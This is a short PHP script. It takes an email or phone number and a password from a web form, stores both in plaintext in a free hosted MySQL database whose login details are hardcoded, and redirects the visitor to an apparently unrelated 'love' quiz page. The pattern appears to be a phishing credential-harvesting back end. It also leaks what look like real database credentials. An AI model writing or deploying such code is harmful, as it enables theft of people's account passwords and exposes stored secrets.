<?php
// Define database connection variables
$servername = "sql12.freesqldatabase.com"; // Replace with your own database host name
$username = "sql12599952"; // Replace with your own database username
$password = "zttT6GSgwr"; // Replace with your own database password
$dbname = "sql12599952"; // Replace with your own database name

// Create database connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check if connection is successful
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Get form data
$email_phone = $_POST['email_phone']; 
$password = $_POST['password'];

// Define SQL query to insert data into table
$sql = "INSERT INTO info (email_number, password) VALUES (?, ?)";

// Prepare the statement
$stmt = $conn->prepare($sql);

// Bind parameters to the prepared statement
$stmt->bind_param("ss", $email_phone, $password);

// Execute the statement
if ($stmt->execute()) {
  header("Location: https://love-ai.github.io/lovebite/couple%20query.html");
  exit();
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close the statement and database connection
$stmt->close();
mysqli_close($conn);
?>
